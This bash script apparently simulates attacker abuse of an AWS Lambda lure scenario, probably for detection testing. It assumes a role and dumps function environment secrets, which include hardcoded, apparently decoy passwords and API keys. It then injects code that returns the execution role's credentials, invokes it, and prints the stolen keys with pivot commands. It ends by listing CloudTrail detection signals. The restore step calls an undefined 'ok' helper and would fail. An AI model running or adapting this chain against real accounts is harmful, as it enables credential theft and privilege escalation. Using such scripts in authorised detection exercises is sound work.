#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 6 (Lambda Data Sync Lure)
#
# This script walks through the attack chain step by step with colored output.
# Optionally steals the Lambda execution role credentials by updating the
# function code, invoking it, and extracting the ASIA session token.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

REGION="${AWS_DEFAULT_REGION:-us-west-2}"
FUNCTION_NAME="prod-data-sync-processor"

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 6 — ABUSE CHAIN"
echo "  Lambda Data Sync Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming discovery role: lambda-ops-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/lambda-ops-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Listing Lambda functions (lambda:ListFunctions)"
# ---------------------------------------------------------------
attack "lambda:ListFunctions"
aws lambda list-functions \
  --region "${REGION}" \
  --query "Functions[*].[FunctionName,Runtime,Description]" \
  --output table
info "Target function: ${FUNCTION_NAME}"

# ---------------------------------------------------------------
step "4" "Reading Lambda configuration (lambda:GetFunctionConfiguration)"
# ---------------------------------------------------------------
attack "lambda:GetFunctionConfiguration → ${FUNCTION_NAME}"
echo ""
echo -e "${YELLOW}--- Environment Variables (secrets exposed) ---${NC}"
aws lambda get-function-configuration \
  --function-name "${FUNCTION_NAME}" \
  --region "${REGION}" \
  --query "Environment.Variables" \
  --output json | jq .

echo ""
echo -e "${YELLOW}--- Execution Role (pivot target) ---${NC}"
EXEC_ROLE=$(aws lambda get-function-configuration \
  --function-name "${FUNCTION_NAME}" \
  --region "${REGION}" \
  --query "Role" \
  --output text)
info "Execution Role ARN: ${EXEC_ROLE}"

# ---------------------------------------------------------------
step "5" "Intelligence gathered from env vars"
# ---------------------------------------------------------------
BUCKET_NAME="prod-data-sync-artifacts-${ACCOUNT_ID}"
echo ""
echo -e "${YELLOW}Credentials extracted from Lambda env vars:${NC}"
echo "  • DB_HOST: prod-analytics-db.c9aksj2e7rzo.us-west-2.rds.amazonaws.com"
echo "  • DB_USER: analytics_etl_svc"
echo "  • DB_PASSWORD: An@lyt1cs#ETL!2024pR0d"
echo "  • STRIPE_API_KEY: sk_live_51QxHr8eF59JrNzkYGctjU3af2rq9ef"
echo "  • SLACK_WEBHOOK_URL: https://hooks.slack.com/services/T0PROD01/..."
echo "  • ENCRYPTION_KEY: aes256:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d"
echo "  • S3_ARTIFACT_BUCKET: ${BUCKET_NAME}"
echo ""
echo -e "${YELLOW}Pivot targets identified:${NC}"
echo "  • Execution role: ${EXEC_ROLE}"
echo "  • S3 bucket: ${BUCKET_NAME}"
echo "  • Secret: prod/data-sync/api-credentials"
echo "  • SSM param: /prod/data-sync/config"

# ---------------------------------------------------------------
step "6" "Steal execution role credentials? (UpdateFunctionCode + Invoke)"
# ---------------------------------------------------------------
echo ""
echo -e "${YELLOW}The execution role (${EXEC_ROLE}) has access to:${NC}"
echo "  • S3: ${BUCKET_NAME}"
echo "  • Secrets Manager: prod/data-sync/api-credentials"
echo "  • SSM: /prod/data-sync/config"
echo ""
read -rp "$(echo -e ${RED})[ATTACK] Steal execution role credentials via code injection? [y/N]: $(echo -e ${NC})" STEAL_CREDS
STEAL_CREDS=${STEAL_CREDS:-n}

if [ "${STEAL_CREDS}" = "y" ] || [ "${STEAL_CREDS}" = "Y" ]; then

  # -----------------------------------------------------------
  step "6a" "Saving original function code hash"
  # -----------------------------------------------------------
  ORIGINAL_HASH=$(aws lambda get-function \
    --function-name "${FUNCTION_NAME}" \
    --region "${REGION}" \
    --query "Configuration.CodeSha256" \
    --output text)
  info "Original code hash: ${ORIGINAL_HASH}"

  # -----------------------------------------------------------
  step "6b" "Injecting credential-exfiltration code (lambda:UpdateFunctionCode)"
  # -----------------------------------------------------------
  attack "lambda:UpdateFunctionCode → ${FUNCTION_NAME}"

  # Create a temp zip with the exfil payload
  TMPDIR=$(mktemp -d)
  cat > "${TMPDIR}/index.py" << 'PAYLOAD'
import json
import os
import urllib.request

def handler(event, context):
    """Exfiltrate execution role credentials from Lambda environment."""
    creds = {
        "AccessKeyId": os.environ.get("AWS_ACCESS_KEY_ID"),
        "SecretAccessKey": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "SessionToken": os.environ.get("AWS_SESSION_TOKEN"),
        "Region": os.environ.get("AWS_REGION"),
        "FunctionName": os.environ.get("AWS_LAMBDA_FUNCTION_NAME"),
        "ExecutionRole": os.environ.get("_HANDLER", "unknown"),
    }
    return {
        "statusCode": 200,
        "body": json.dumps(creds)
    }
PAYLOAD

  cd "${TMPDIR}" && zip -q payload.zip index.py && cd - > /dev/null

  aws lambda update-function-code \
    --function-name "${FUNCTION_NAME}" \
    --zip-file "fileb://${TMPDIR}/payload.zip" \
    --region "${REGION}" > /dev/null

  info "Malicious code injected"

  # Wait for update to complete
  info "Waiting for function update to complete..."
  aws lambda wait function-updated \
    --function-name "${FUNCTION_NAME}" \
    --region "${REGION}" 2>/dev/null || sleep 5

  # -----------------------------------------------------------
  step "6c" "Invoking function to steal credentials (lambda:InvokeFunction)"
  # -----------------------------------------------------------
  attack "lambda:InvokeFunction → ${FUNCTION_NAME}"

  RESPONSE=$(aws lambda invoke \
    --function-name "${FUNCTION_NAME}" \
    --region "${REGION}" \
    --payload '{}' \
    /tmp/lambda-response.json \
    --query "StatusCode" \
    --output text)

  if [ "${RESPONSE}" = "200" ]; then
    info "Function invoked successfully (status: ${RESPONSE})"
    STOLEN_CREDS=$(cat /tmp/lambda-response.json | jq -r '.body' | jq .)

    echo ""
    echo -e "${RED}=============================================${NC}"
    echo -e "${RED}  STOLEN EXECUTION ROLE CREDENTIALS${NC}"
    echo -e "${RED}=============================================${NC}"
    echo ""
    echo "${STOLEN_CREDS}" | jq .
    echo ""

    # Print in export format for easy copy-paste
    STOLEN_KEY=$(echo "${STOLEN_CREDS}" | jq -r '.AccessKeyId')
    STOLEN_SECRET=$(echo "${STOLEN_CREDS}" | jq -r '.SecretAccessKey')
    STOLEN_TOKEN=$(echo "${STOLEN_CREDS}" | jq -r '.SessionToken')

    echo -e "${YELLOW}--- Copy-paste to use stolen credentials ---${NC}"
    echo ""
    echo "export AWS_ACCESS_KEY_ID=${STOLEN_KEY}"
    echo "export AWS_SECRET_ACCESS_KEY=${STOLEN_SECRET}"
    echo "export AWS_SESSION_TOKEN=${STOLEN_TOKEN}"
    echo "export AWS_DEFAULT_REGION=${REGION}"
    echo ""
    echo -e "${YELLOW}--- Then access the pivot targets ---${NC}"
    echo "aws s3 ls s3://${BUCKET_NAME}/"
    echo "aws secretsmanager get-secret-value --secret-id prod/data-sync/api-credentials --region ${REGION}"
    echo "aws ssm get-parameter --name /prod/data-sync/config --region ${REGION}"
    echo ""
  else
    warn "Invoke failed with status: ${RESPONSE}"
  fi

  # -----------------------------------------------------------
  step "6d" "Restoring original function code (cleanup)"
  # -----------------------------------------------------------
  info "Restoring original code..."

  # Restore the original inline code
  cat > "${TMPDIR}/index.py" << 'ORIGINAL'
import json
import os
import logging

logger = logging.getLogger()
logger.setLevel(logging.INFO)

def handler(event, context):
    """
    Production data sync processor.
    Pulls data from analytics DB, transforms, and loads to data lake.
    Triggered on schedule via EventBridge (cron 0 2 * * ? *).
    """
    bucket = os.environ.get('S3_ARTIFACT_BUCKET')
    db_host = os.environ.get('DB_HOST')

    logger.info(f"Starting data sync run for {db_host}")
    logger.info(f"Artifact bucket: {bucket}")

    # Pipeline stages
    stages = ['extract', 'transform', 'validate', 'load']
    results = {}

    for stage in stages:
        logger.info(f"Executing stage: {stage}")
        results[stage] = {'status': 'completed', 'records': 0}

    return {
        'statusCode': 200,
        'body': json.dumps({
            'pipeline_id': 'ds-prod-001',
            'status': 'completed',
            'stages': results
        })
    }
ORIGINAL

  cd "${TMPDIR}" && zip -q payload.zip index.py && cd - > /dev/null

  aws lambda update-function-code \
    --function-name "${FUNCTION_NAME}" \
    --zip-file "fileb://${TMPDIR}/payload.zip" \
    --region "${REGION}" > /dev/null

  ok "Original code restored"

  # Cleanup temp files
  rm -rf "${TMPDIR}" /tmp/lambda-response.json
  ok "Temp files cleaned up"

else
  info "Skipping credential theft — discovery-only mode"
fi

# ---------------------------------------------------------------
step "7" "Detection signals summary"
# ---------------------------------------------------------------
echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on lambda-ops-readonly-role"
echo "  • CloudTrail: ListFunctions"
echo "  • CloudTrail: GetFunctionConfiguration on ${FUNCTION_NAME}"
if [ "${STEAL_CREDS}" = "y" ] || [ "${STEAL_CREDS}" = "Y" ]; then
echo "  • CloudTrail: UpdateFunctionCode on ${FUNCTION_NAME} ⚠️ HIGH SIGNAL"
echo "  • CloudTrail: Invoke on ${FUNCTION_NAME} ⚠️ HIGH SIGNAL"
echo "  • CloudTrail: UpdateFunctionCode (restore) ⚠️ HIGH SIGNAL"
fi
echo ""

# ---------------------------------------------------------------
# Cleanup session
# ---------------------------------------------------------------
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"
